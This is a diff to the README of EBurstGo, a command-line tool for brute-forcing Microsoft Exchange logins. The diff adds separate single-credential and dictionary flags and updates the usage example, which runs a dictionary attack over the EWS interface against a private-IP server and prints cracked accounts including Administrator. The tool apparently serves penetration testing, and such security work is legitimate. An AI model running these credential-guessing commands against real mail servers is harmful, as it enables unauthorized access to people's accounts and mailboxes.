@@ -34,12 +34,16 @@ Usage of ./EBurstGo:
   -mode string
     	指定 Exchange Web 接口
   -pass string
+    	指定密码
+  -passf string
     	密码字典
   -thread int
     	协程数量 (default 2)
   -url string
     	Exchange 服务器地址
   -user string
+    	指定用户名
+  -userf string
     	用户名字典
   -verbose
     	显示详细信息
@@ -64,13 +68,14 @@ $ ./EBurstGo -url https://192.168.30.11 -check
 brute
 
 ```shell
-$ ./EBurstGo -url https://192.168.30.11 -domain hack-my.com -user users.txt -pass pass.txt -mode ews
+$ ./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userf user.txt -passf pass.txt -mode ews
 [*] 使用 ews 接口爆破: https://192.168.30.11
+[*] 用户名:7 密码:9 共计:63
 [+] 成功: Administrator:abcd1234!@#$
 [+] 成功: Alice:Alice123!
 [+] 成功: Bob:Bob123!
 [+] 成功: Marry:Marry123!
-[*] 耗时: 4.40084275s
+[*] 耗时: 3.031753209s
 ```
 
 已知 bug:
